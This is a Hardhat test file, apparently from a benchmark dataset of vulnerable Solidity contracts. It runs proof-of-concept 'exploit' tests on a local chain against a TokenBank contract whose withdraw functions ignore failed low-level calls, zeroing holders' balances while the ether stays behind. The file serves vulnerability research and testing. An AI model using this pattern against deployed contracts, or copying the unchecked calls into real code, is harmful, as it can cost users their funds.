const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const path = require("path");
const fs = require("fs");

describe("attack unchecked_low_level_calls/0x3a0e9acd953ffc0dd18d63603488846a6b8b2b01.sol", function () {
  let owner, sig;
  async function deployContracts() {
    [owner, sig] = await ethers.getSigners();
    const codePath = path.join(
      __dirname,
      "../../artifacts/contracts/dataset/unchecked_low_level_calls/0x3a0e9acd953ffc0dd18d63603488846a6b8b2b01.sol/TokenBank.json",
    );
    const json = JSON.parse(fs.readFileSync(codePath));
    const TokenBank = await ethers.getContractFactory(json.abi, json.bytecode);
    const contract = await TokenBank.connect(owner).deploy();

    const RevertContract = await ethers.getContractFactory(
      "contracts/unchecked_low_level_calls/revert_contract.sol:RevertContract",
    );
    const revertContract = await RevertContract.deploy();

    const TokenEBU = await ethers.getContractFactory(
      "contracts/unchecked_low_level_calls/TokenEBU.sol:TokenEBU",
    );
    const token = await TokenEBU.connect(owner).deploy(10, "EBU", "EBU");

    return { contract, revertContract, token };
  }

  it("functional check: unchecked_low_level_calls/0x3a0e9acd953ffc0dd18d63603488846a6b8b2b01.sol", async function () {
    const { contract, token } = await loadFixture(deployContracts);
    const ownerBalance = await token.balanceOf(owner.address);
    const amount = ethers.parseEther("2");
    await expect(contract.connect(owner).initTokenBank()).to.not.be.reverted;
    await expect(token.connect(owner).transfer(contract.target, 10)).to.not.be
      .reverted;
    expect(await token.balanceOf(contract.target)).to.equal(10);
    await expect(
      contract.connect(owner).WithdrawToken(token.target, 10, owner.address),
    ).to.not.be.reverted;
    expect(await token.balanceOf(owner.address)).to.equal(ownerBalance);
    expect(await sig.sendTransaction({ to: contract.target, value: amount })).to
      .not.be.reverted;
    expect(await ethers.provider.getBalance(contract.target)).to.equal(amount);
    expect(await contract.Holders(sig.address)).to.equal(amount);
  });

  it("exploit unchecked low level call vulnerability in WithdrawToken()", async function () {
    const { contract, revertContract } = await loadFixture(deployContracts);

    await contract.connect(owner).initTokenBank();

    const minDeposit = await contract.MinDeposit();
    const oneEther = ethers.parseEther("1");
    expect(minDeposit).to.equal(oneEther);

    await expect(
      sig.sendTransaction({
        to: revertContract.target,
        value: oneEther,
      }),
    ).to.be.revertedWith("I always revert!");

    const amount = ethers.parseEther("2");
    // Signer deposits ether to become a holder
    await sig.sendTransaction({
      to: contract.target,
      value: amount,
    });

    expect(await ethers.provider.getBalance(contract.target)).to.equal(amount);

    // Expect signer to be in Holders
    expect(await contract.Holders(sig.address)).to.equal(amount);

    // signer puts the wrong address in the withdraw function
    await contract.WitdrawTokenToHolder(
      sig.address,
      revertContract.target,
      amount,
    );

    //signer no longer holds tokens
    expect(await contract.Holders(sig.address)).to.equal(0);

    const revertBalance = await ethers.provider.getBalance(
      revertContract.target,
    );
    // the wrong contract doesn't get the ether
    expect(revertBalance).to.equal(0);

    // the contract still holds the ether
    expect(await ethers.provider.getBalance(contract.target)).to.equal(amount);
  });

  it("exploit unchecked low level call vulnerability in WithdrawToHolder()", async function () {
    const { contract, revertContract } = await loadFixture(deployContracts);

    await contract.connect(owner).initTokenBank();

    const minDeposit = await contract.MinDeposit();
    const oneEther = ethers.parseEther("1");
    expect(minDeposit).to.equal(oneEther);

    await expect(
      sig.sendTransaction({
        to: revertContract.target,
        value: oneEther,
      }),
    ).to.be.revertedWith("I always revert!");

    const amount = ethers.parseEther("2");

    await revertContract
      .connect(sig)
      .sendEther(contract.target, { value: amount });

    await owner.sendTransaction({
      to: contract.target,
      value: amount,
    });

    expect(await ethers.provider.getBalance(contract.target)).to.equal(
      amount + amount,
    );

    expect(await contract.Holders(revertContract.target)).to.equal(amount);

    expect(await contract.Holders(owner.address)).to.equal(amount);

    await contract
      .connect(owner)
      .WithdrawToHolder(revertContract.target, amount);

    expect(await contract.Holders(owner.address)).to.equal(amount);
    expect(await contract.Holders(revertContract.target)).to.equal(0);

    const revertBalance = await ethers.provider.getBalance(
      revertContract.target,
    );
    expect(revertBalance).to.equal(0);

    expect(await ethers.provider.getBalance(contract.target)).to.equal(
      amount + amount,
    );
  });
});
